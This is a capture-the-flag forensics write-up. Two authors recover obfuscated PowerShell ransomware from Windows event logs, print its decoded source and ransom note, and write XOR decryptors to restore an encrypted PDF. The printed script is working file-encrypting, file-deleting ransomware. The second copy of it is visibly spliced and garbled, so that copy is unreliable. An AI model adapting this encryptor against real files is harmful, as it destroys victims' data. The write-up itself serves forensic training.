---
title: "cave expedition - event-log - evtx - powershell - encryption"
description: "Cave Expedition is a medium forensics challenge that involves analyzing obfuscated PowerShell code, understanding its logic, and developing a decryption process to obtain the final flag"
published: "2025-08-29"
updated: "2025-08-29"
event: "HTB Cyber Apocalyse"
category: "Reverse Engineering"
kind: "writeup"
status: "solved"
tags: ["Reverse Engineering", "HTB Cyber Apocalyse", "Writeup"]
readingTime: 2
wordCount: 324
featured: false
sourcePath: "~/ctf/writeups/(HTB Cyber Apocalyse)cave expedition - event-log - evtx - powershell - encryption.md"
---

# cave expedition - event-log - evtx - powershell - encryption

## Description

Cave Expedition is a medium forensics challenge that involves analyzing obfuscated PowerShell code, understanding its logic, and developing a decryption process to obtain the final flag


----
## Thought process
> solution by Danh Quan

We are given a `map.pdf.secured` file and a log folder.

![](http://note.bksec.vn/pad/uploads/7164baa7-3d20-4552-96a7-e2ef97073468.png)

Unzipping the `Logs.zip` give us a Logs folder. After inspecting it, only one of them seem to has data.

![](http://note.bksec.vn/pad/uploads/7a335cf7-db2c-4a3e-91ba-5fc3f08fe5e6.png)

Using `Event Viewer` is fine but I would like to check it in .csv format so i use `EvtxECmd` to parse it so i could use `Timeline Explorer`. 

> Check out my seminar about `EvtxECmd` and `Timeline Explorer` [here](https://www.youtube.com/watch?v=LWWiItCUuEQ) <3 

After parsing it to .csv and open it with TE.

![](http://note.bksec.vn/pad/uploads/75131d7b-b38c-4d20-9e07-5c5430b37d29.png)

![](http://note.bksec.vn/pad/uploads/9fa4dfc2-f205-4cb9-af6a-ee6562dd8f58.png)

We noticed this in the logs. A bunch of base64 encoded text was written in `avAFGrw41.bat`

![](http://note.bksec.vn/pad/uploads/e7e90841-ed38-4acb-a1f2-7dde31997330.png)

Then it was executed after being converted to `.ps1` 

![](http://note.bksec.vn/pad/uploads/f3381a04-b524-41ae-aa09-c4e22e736991.png)

-> A malicious script was executed after being decoded from base64 -> Decoding the base64 to get the original script.

```bash
# File extensions to target (*.txt *.doc *.docx *.pdf)
$fileExtensionsB64 = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"

# Base64-encoded ransom message
$ransomMessageB64 = "LS0tLS0tLS...[rest of the message]..."

# Base64-encoded encryption key 1
$key1B64 = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="

# Base64-encoded encryption key 2 (nonsense string)
$key2B64 = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

# Character mapping dictionaries
$forwardCharMap = @{}
$reverseCharMap = @{}

# Build forward character rotation map (A->B, B->C, ..., Z->A)
for ($i = 65; $i -le 90; $i++) {
    $forwardCharMap[([char]$i)] = if($i -eq 90) { [char]65 } else { [char]($i + 1) }
}

# Decode and return ransom message
function Get-RansomMessage {
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ransomMessageB64))
}

# Decode and split file extensions
function Get-TargetExtensions {
    return (Decode-Base64 $fileExtensionsB64).Split(" ")
}

# Add lowercase character mapping (a->b, b->c, ..., z->a)
for ($i = 97; $i -le 122; $i++) {
    $forwardCharMap[([char]$i)] = if($i -eq 122) { [char]97 } else { [char]($i + 1) }
}

# Base64 decode function
function Decode-Base64 {
    param([string]$encoded)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
}

# Decode encryption keys
$key1 = Decode-Base64 $key1B64
$key2 = Decode-Base64 $key2B64

# Add number mapping (0->1, 1->2, ..., 9->0)
for ($i = 48; $i -le 57; $i++) {
    $forwardCharMap[([char]$i)] = if($i -eq 57) { [char]48 } else { [char]($i + 1) }
}

# Create reverse mapping
$forwardCharMap.GetEnumerator() | ForEach-Object {
    $reverseCharMap[$_.Value] = $_.Key
}

# XOR encryption function using two keys
function Encrypt-Bytes {
    param([byte[]]$data, [byte[]]$key1Bytes, [byte[]]$key2Bytes)
    $encrypted = [byte[]]::new($data.Length)
    for ($i = 0; $i -lt $data.Length; $i++) {
        $k1 = $key1Bytes[$i % $key1Bytes.Length]
        $k2 = $key2Bytes[$i % $key2Bytes.Length]
        $encrypted[$i] = $data[$i] -bxor $k1 -bxor $k2
    }
    return $encrypted
}

# Encrypt data and convert to Base64
function Encrypt-ToBase64 {
    param([byte[]]$data, [string]$key1Str, [string]$key2Str)
    if ($data -eq $null -or $data.Length -eq 0) {
        return $null
    }
    $key1Bytes = [System.Text.Encoding]::UTF8.GetBytes($key1Str)
    $key2Bytes = [System.Text.Encoding]::UTF8.GetBytes($key2Str)
    $encryptedBytes = Encrypt-Bytes $data $key1Bytes $key2Bytes
    return [Convert]::ToBase64String($encryptedBytes)
}

# Main encryption function
function Start-Encryption {
    param([switch]$execute)
    try {
        if ($execute) {
            foreach ($ext in Get-TargetExtensions) {
                $targetPath = "dca01aq2/"
                if (Test-Path $targetPath) {
                    Get-ChildItem -Path $targetPath -Recurse -ErrorAction Stop |
                        Where-Object { $_.Extension -match "^\.$ext$" } |
                        ForEach-Object {
                            $filePath = $_.FullName
                            if (Test-Path $filePath) {
                                $fileBytes = [IO.File]::ReadAllBytes($filePath)
                                $encryptedData = Encrypt-ToBase64 $fileBytes $key1 $key2
                                [IO.File]::WriteAllText("$filePath.secured", $encryptedData)
                                Remove-Item $filePath -Force
                            }
                        }
                }
            }
        }
    }
    catch {}
}

# Execute if running on specific machine
if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
    Start-Encryption -execute
    Get-RansomMessage
}
```
With a little help from out faithful friend `Grok` we know how the script work.

The script will encode `(*.txt *.doc *.docx *.pdf)` file to `.secured` file just like the `map.pdf.secured` file we recieved. The encryption was using XOR with key1 and key2 -> the mapping was useless in this scenario.

So we only need to reverse the XOR encryption.

This is a bash shell command to reverse the encryption 

```bash
$key1 = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$key2 = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

function b64decode {
    param([string]$encoded)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
}


$key1 = b64decode $key1
$key2 = b64decode $key2

function bytes_encryption {
    param([byte[]]$data, [byte[]]$key1Bytes, [byte[]]$key2Bytes)
    $result = [byte[]]::new($data.Length)
    for ($i = 0; $i -lt $data.Length; $i++) {
        $k1 = $key1Bytes[$i % $key1Bytes.Length]
        $k2 = $key2Bytes[$i % $key2Bytes.Length]
        $result[$i] = $data[$i] -bxor $k1 -bxor $k2
    }
    return $result
}

$file = Get-Content "map.pdf.secured" -Raw

$encryptedBytes = [Convert]::FromBase64String($file)

$key1Bytes = [System.Text.Encoding]::UTF8.GetBytes($key1)
$key2Bytes = [System.Text.Encoding]::UTF8.GetBytes($key2)

$decryptedBytes = bytes_encryption $encryptedBytes $key1Bytes $key2Bytes

[IO.File]::WriteAllBytes("map.pdf", $decryptedBytes)
```

Or using python

```python
import base64

key1 = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
key2 = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"


key1_bytes = base64.b64decode(key1)
key2_bytes = base64.b64decode(key2)

key1_str = key1_bytes.decode('utf-8', errors='replace')
key2_str = key2_bytes.decode('utf-8', errors='replace')

key1_bytes2 = key1_str.encode('utf-8')
key2_bytes2 = key2_str.encode('utf-8')


with open("map.pdf.secured", "r", encoding='utf-8') as f:
    base64_encrypted = f.read().strip() 


encrypted_bytes = base64.b64decode(base64_encrypted)


def xor_bytes(data, key1, key2):
    result = bytearray()
    for i, byte in enumerate(data):
        k1 = key1[i % len(key1)]
        k2 = key2[i % len(key2)]
        result.append(byte ^ k1 ^ k2)  
    return bytes(result)


decrypted_bytes = xor_bytes(encrypted_bytes, key1_bytes, key2_bytes)

with open("map.pdf", "wb") as f:
    f.write(decrypted_bytes)
```
Executing either script will give us the decoded file `map.pdf`

![](http://note.bksec.vn/pad/uploads/55715f04-b2e4-4586-8791-be0721228193.png)

![](http://note.bksec.vn/pad/uploads/528d24a8-53b5-4707-a8b1-6b2c770bae20.png)


# Another WU by howdoitype
The goal of the challenge is pretty clear: To extract whatever info was left in the evtx files in hope to decrypt the `map.pdf.secure` file. 


We use a tool called `chainsaw` to inspect the .evtx files

running chainsaw to dump the contents of these files:
`./chainsaw dump ~/htb/Logs`
```
...
System:
    Provider_attributes:
      Name: Microsoft-Windows-Sysmon
      Guid: 5770385F-C22A-43E0-BF4C-06F5698FFBD9
    EventID: 1
    Version: 5
    Level: 4
    Task: 1
    Opcode: 0
    Keywords: '0x8000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-01-28T10:31:25.040005Z
    EventRecordID: 43344
    Correlation: null
    Execution_attributes:
      ProcessID: 2516
      ThreadID: 1060
    Channel: Microsoft-Windows-Sysmon/Operational
    Computer: Workstation5678
    Security_attributes:
      UserID: S-1-5-18
  EventData:
    RuleName: '-'
    UtcTime: 2025-01-28 10:31:25.034
    ProcessGuid: 9EF5B0CE-B1FD-6798-5C05-000000001600
    ProcessId: 5944
    Image: C:\Windows\System32\wevtutil.exe
    FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
    Description: Eventing Command Line Utility
    Product: Microsoft® Windows® Operating System
    Company: Microsoft Corporation
    OriginalFileName: wevtutil.exe
    CommandLine: '"C:\Windows\system32\wevtutil.exe" epl Microsoft-Windows-TerminalServices-RemoteConnectionManager/Admin C:\Temp\Logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager_Admin.evtx'
    CurrentDirectory: C:\Users\developer56546756\Desktop\
    User: WORKSTATION5678\developer56546756
    LogonGuid: 9EF5B0CE-B10E-6798-E238-010000000000
    LogonId: '0x138e2'
    TerminalSessionId: 1
    IntegrityLevel: High
    Hashes: MD5=1F970DDF2061B33C148E72604D2170FB,SHA256=5293A95BE8F320A3AF6D8C1D5E937F13D0EE2925B9B13538487DEC0181EF5432,IMPHASH=D3310B6271278C48FE7AE9F4AD5259B6
    ParentProcessGuid: 9EF5B0CE-B1DA-6798-9E00-000000001600
    ParentProcessId: 2708
    ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    ParentCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" '
    ParentUser: WORKSTATION5678\developer56546756
...
```

We are mostly interested in the `CommandLine` field. So extract those and look for suspicious things:
`/chainsaw dump ~/htb/Logs | grep "CommandLine" | less`
![](http://note.bksec.vn/pad/uploads/1857a2b2-75f7-4d93-a489-ef374c5895c2.png)
bingo
decode from base64, we get the following shell script:
```shell
$k34Vm = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
$m78Vo = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
$a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

$e90Vg = @{}
$f12Vh = @{}

For ($x = 65; $x -le 90; $x++) {
	$e90Vg[([char]$x)] = if($x -eq 90) { [S0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
$a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

$e90Vg = @{}
$f12Vh = @{}

For ($x = 65; $x -le 90; $x++) {
	$e90Vg[([char]$x)] = if($x -eq 90) { [rn [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
}

$c56Ve = a12Vc $a53Va
$d78Vf = a12Vc $b64Vb

For ($x = 48; $x -le 57; $x++) {
	$e90Vg[([char]$x)] = if($x -eq 57) { [char]48 } else { [char]($x + 1) }
}

$e90Vg.GetEnumerator() | ForEach-Object {
	$f12Vh[$_.Value] = $_.Key
}

function l34Vn {
	param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
	$p12Vr = [byte[]]::new($m56Vo.Length)
	for ($x = 0; $x -lt $m56Vo.Length; $x++) {
    	$q34Vs = $n78Vp[$x % $n78Vp.Length]
    	$r56Vt = $o90Vq[$x % $o90Vq.Length]
    	$p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
	}
	return $p12Vr
}

function s78Vu {
	param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)

	if ($t90Vv -eq $null -or $t90Vv.Length -eq 0) {
    	return $null
	}

	$y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
	$z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
	$a34Vc = l34Vn $t90Vv $y90Va $z12Vb

	return [Convert]::ToBase64String($a34Vc)
}

function o12Vq {
	param([switch]$p34Vr)

	try {
    	if ($p34Vr) {
        	foreach ($q56Vs in l56Vn) {
            	$d34Vp = "dca01aq2/"
            	if (Test-Path $d34Vp) {
                	Get-ChildItem -Path $d34Vp -Recurse -ErrorAction Stop |
                    	Where-Object { $_.Extension -match "^\.$q56Vs$" } |
                    	ForEach-Object {
                        	$r78Vt = $_.FullName
                        	if (Test-Path $r78Vt) {
                            	$s90Vu = [IO.File]::ReadAllBytes($r78Vt)
                            	$t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
                            	[IO.File]::WriteAllText("$r78Vt.secured", $t12Vv)
                            	Remove-Item $r78Vt -Force
                        	}
                    	}
            	}
        	}
    	}
	}
	catch {}
}

if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
	o12Vq -p34Vr
	n90Vp
}

```
now this looks like more if a reverse engineering challenge.
Decoding $m78Vo reveals:

```
YOUR FILES HAVE BEEN ENCRYPTED BY A RANSOMWARE
* What happened?
Most of your files are no longer accessible because they have been encrypted. Do not waste your time trying to decrypt them; it is impossible without our help.

* How to recover my files?
Recovering your files is 100% guaranteed if you follow our instructions.

* Is there a deadline?
Of course, there is. You have ten days left. Do not miss this deadline.
```
Interesting. It's time to reverse the logic of this malware, and get the flag.
